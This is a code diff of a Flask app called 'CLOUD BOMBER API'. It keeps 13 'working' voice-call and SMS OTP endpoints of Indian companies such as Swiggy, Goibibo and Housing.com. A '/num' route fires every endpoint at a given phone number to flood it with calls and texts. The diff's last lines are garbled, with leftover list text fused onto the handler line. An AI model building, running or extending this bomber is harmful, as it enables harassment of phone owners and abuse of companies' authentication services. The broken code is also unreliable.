@@ -1,68 +1,39 @@
 # api/index.py
-import json
-import asyncio
-import aiohttp
-import time
 from flask import Flask, request, jsonify
 from flask_cors import CORS
+import json
+import requests
+import time
 
 app = Flask(__name__)
 CORS(app)
 
-TIMEOUT = 15
-DELAY = 2
-
 # ============================================================
-#  ALL APIS (44 Total)
+#  13 CONFIRMED WORKING APIS
 # ============================================================
 APIS = [
-    # ===== CALL APIs (9) =====
     {
         "name": "Tata Capital Voice",
         "type": "Call",
         "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
         "method": "POST",
-        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
+        "headers": {"Content-Type": "application/json"},
         "body": lambda p: {"phone": p, "isOtpViaCallAtLogin": "true"}
-    },
-    {
-        "name": "MakeMyTrip Voice",
-        "type": "Call",
-        "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
-        "body": lambda p: {"phone": p}
-    },
-    {
-        "name": "Uber Voice",
-        "type": "Call",
-        "url": "https://auth.uber.com/v2/voice-otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
-        "body": lambda p: {"phone": p}
     },
     {
         "name": "Goibibo Voice",
         "type": "Call",
         "url": "https://www.goibibo.com/user/voice-otp/generate/",
         "method": "POST",
-        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
+        "headers": {"Content-Type": "application/json"},
         "body": lambda p: {"phone": p}
-    },
-    {
-        "name": "Amazon Voice",
-        "type": "Call",
-        "url": "https://www.amazon.in/ap/signin",
-        "method": "POST",
-        "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"},
-        "body": lambda p: f"phone={p}&action=voice_otp"
     },
     {
         "name": "1MG Voice",
         "type": "Call",
         "url": "https://www.1mg.com/auth_api/v6/create_token",
         "method": "POST",
-        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
+        "headers": {"Content-Type": "application/json"},
         "body": lambda p: {"number": p, "otp_on_call": True}
     },
     {
@@ -70,121 +41,39 @@ APIS = [
         "type": "Call",
         "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
         "method": "POST",
-        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
+        "headers": {"Content-Type": "application/json"},
         "body": lambda p: {"mobile": p}
-    },
-    {
-        "name": "Flipkart Voice",
-        "type": "Call",
-        "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
-        "body": lambda p: {"mobile": p}
-    },
-    {
-        "name": "Zivame Voice",
-        "type": "Call",
-        "url": "https://api.zivame.com/v2/customer/login/send-otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
-        "body": lambda p: {"phone_number": p, "otp_type": "voice"}
-    },
-
-    # ===== SMS APIs (30) =====
-    {
-        "name": "Lenskart SMS",
-        "type": "SMS",
-        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
-        "body": lambda p: {"phoneCode": "+91", "telephone": p}
-    },
-    {
-        "name": "PharmEasy SMS",
-        "type": "SMS",
-        "url": "https://pharmeasy.in/api/v2/auth/send-otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
-        "body": lambda p: {"phone": p}
-    },
-    {
-        "name": "Snitch SMS",
-        "type": "SMS",
-        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
-        "body": lambda p: {"mobile_number": f"+91{p}"}
-    },
-    {
-        "name": "ShipRocket SMS",
-        "type": "SMS",
-        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
-        "body": lambda p: {"mobileNumber": p}
     },
     {
         "name": "GoKwik SMS",
         "type": "SMS",
         "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
         "method": "POST",
-        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
+        "headers": {"Content-Type": "application/json"},
         "body": lambda p: {"phone": p, "country": "in"}
-    },
-    {
-        "name": "NewMe SMS",
-        "type": "SMS",
-        "url": "https://prodapi.newme.asia/web/otp/request",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
-        "body": lambda p: {"mobile_number": p, "resend_otp_request": True}
-    },
-    {
-        "name": "Wakefit SMS",
-        "type": "SMS",
-        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
-        "body": lambda p: {"mobile": p}
     },
     {
         "name": "Hungama OTP",
         "type": "SMS",
         "url": "https://communication.api.hungama.com/v1/communication/otp",
         "method": "POST",
-        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
+        "headers": {"Content-Type": "application/json"},
         "body": lambda p: {"mobileNo": p, "countryCode": "+91", "appCode": "un", "messageId": "1", "device": "web"}
-    },
-    {
-        "name": "Doubtnut",
-        "type": "SMS",
-        "url": "https://api.doubtnut.com/v4/student/login",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
-        "body": lambda p: {"phone_number": p, "language": "en"}
     },
     {
         "name": "PenPencil",
         "type": "SMS",
         "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
         "method": "POST",
-        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
+        "headers": {"Content-Type": "application/json"},
         "body": lambda p: {"organizationId": "5eb393ee95fab7468a79d189", "mobile": p}
-    },
-    {
-        "name": "BeepKart",
-        "type": "SMS",
-        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
-        "body": lambda p: {"phone": p, "city": 362}
     },
     {
         "name": "Smytten",
         "type": "SMS",
         "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
         "method": "POST",
-        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
+        "headers": {"Content-Type": "application/json"},
         "body": lambda p: {"phone": p, "email": "test@example.com"}
     },
     {
@@ -192,11 +81,122 @@ APIS = [
         "type": "SMS",
         "url": "https://api.myhubble.money/v1/auth/otp/generate",
         "method": "POST",
-        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
+        "headers": {"Content-Type": "application/json"},
         "body": lambda p: {"phoneNumber": p, "channel": "SMS"}
     },
     {
         "name": "Housing.com",
+        "type": "SMS",
+        "url": "https://login.housing.com/api/v2/send-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "body": lambda p: {"phone": p, "country_url_name": "in"}
+    },
+    {
+        "name": "Animall",
+        "type": "SMS",
+        "url": "https://animall.in/zap/auth/login",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "body": lambda p: {"phone": p, "signupPlatform": "NATIVE_ANDROID"}
+    },
+    {
+        "name": "ShopClues SMS",
+        "type": "SMS",
+        "url": "https://api.shopclues.com/v1/auth/send-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "body": lambda p: {"mobile": p}
+    },
+    {
+        "name": "NewMe SMS",
+        "type": "SMS",
+        "url": "https://prodapi.newme.asia/web/otp/request",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "body": lambda p: {"mobile_number": p, "resend_otp_request": True}
+    },
+]
+
+def hit_api(api, phone):
+    try:
+        url = api["url"]
+        headers = api.get("headers", {"Content-Type": "application/json"})
+        body = api["body"](phone)
+        
+        if api.get("method", "POST") == "POST":
+            response = requests.post(url, json=body, headers=headers, timeout=10)
+        else:
+            response = requests.get(url, params=body, headers=headers, timeout=10)
+        
+        if response.status_code in [200, 201, 202, 204]:
+            return {"name": api["name"], "type": api["type"], "status": "success", "code": response.status_code}
+        else:
+            return {"name": api["name"], "type": api["type"], "status": "failed", "code": response.status_code}
+    except requests.Timeout:
+        return {"name": api["name"], "type": api["type"], "status": "timeout", "code": 408}
+    except Exception as e:
+        return {"name": api["name"], "type": api["type"], "status": "error", "code": 500, "error": str(e)[:50]}
+
+# ============================================================
+#  ROUTES
+# ============================================================
+@app.route('/')
+def home():
+    return jsonify({
+        "name": "CLOUD BOMBER API",
+        "version": "8.0",
+        "developer": "@ZEERYXFF",
+        "status": "active",
+        "total_apis": len(APIS),
+        "endpoints": {
+            "/num?phone=9876543210": "Send to all APIs"
+        }
+    })
+
+@app.route('/num')
+def send_to_number():
+    phone = request.args.get('phone') or request.args.get('num')
+    
+    if not phone:
+        return jsonify({"status": "error", "message": "Phone number required"}), 400
+    
+    phone = ''.join(filter(str.isdigit, phone))
+    if phone.startswith('91'):
+        phone = phone[2:]
+    
+    if len(phone) != 10:
+        return jsonify({"status": "error", "message": "Invalid phone number"}), 400
+    
+    start_time = time.time()
+    results = []
+    
+    for api in APIS:
+        result = hit_api(api, phone)
+        results.append(result)
+    
+    elapsed = time.time() - start_time
+    
+    total = len(results)
+    success = sum(1 for r in results if r.get("status") == "success")
+    failed = total - success
+    
+    return jsonify({
+        "status": "success",
+        "number": phone,
+        "total_apis": total,
+        "success": success,
+        "failed": failed,
+        "success_rate": f"{round((success/total)*100, 1)}%",
+        "time_taken": f"{round(elapsed, 2)}s",
+        "results": results
+    })
+
+# ============================================================
+#  VERCEL HANDLER
+# ============================================================
+from mangum import Mangum
+handler = Mangum(app)        "name": "Housing.com",
         "type": "SMS",
         "url": "https://login.housing.com/api/v2/send-otp",
         "method": "POST",
